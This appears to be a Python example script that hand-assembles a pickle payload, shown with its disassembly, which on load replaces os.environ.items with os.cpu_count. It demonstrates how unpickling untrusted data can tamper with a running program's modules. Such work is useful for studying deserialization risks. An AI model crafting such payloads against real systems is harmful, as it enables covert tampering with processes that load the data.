"""Set a member (function) of a module to another"""

import io
import os
import pickle
import pickletools

from pickleassem import PickleAssembler

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    # Set os.environ.items() to os.cpu_count()
    #  0: \x80 PROTO      4
    #  2: \x8c SHORT_BINUNICODE 'os'
    #  6: \x8c SHORT_BINUNICODE 'environ'
    # 15: \x93 STACK_GLOBAL
    # 16: (    MARK
    # 17: N        NONE
    # 18: }        EMPTY_DICT
    # 19: T        BINSTRING  'items'
    # 29: \x8c     SHORT_BINUNICODE 'os'
    # 33: \x8c     SHORT_BINUNICODE 'cpu_count'
    # 44: \x93     STACK_GLOBAL
    # 45: s        SETITEM
    # 46: t        TUPLE      (MARK at 16)
    # 47: b    BUILD
    # 48: .    STOP

    pa.push_short_binunicode("os")
    pa.push_short_binunicode("environ")
    pa.build_stack_global()
    pa.push_mark()
    pa.push_none()
    pa.push_empty_dict()
    pa.push_binstring("items")
    pa.push_short_binunicode("os")
    pa.push_short_binunicode("cpu_count")
    pa.build_stack_global()
    pa.build_setitem()
    pa.build_tuple()
    pa.build_build()
    payload = pa.assemble()

    f = io.BytesIO(payload)
    print(pickletools.dis(f))

    f = io.BytesIO(payload)
    pickle.load(f)

    # Works, prints cpu count
    print(os.environ.items())
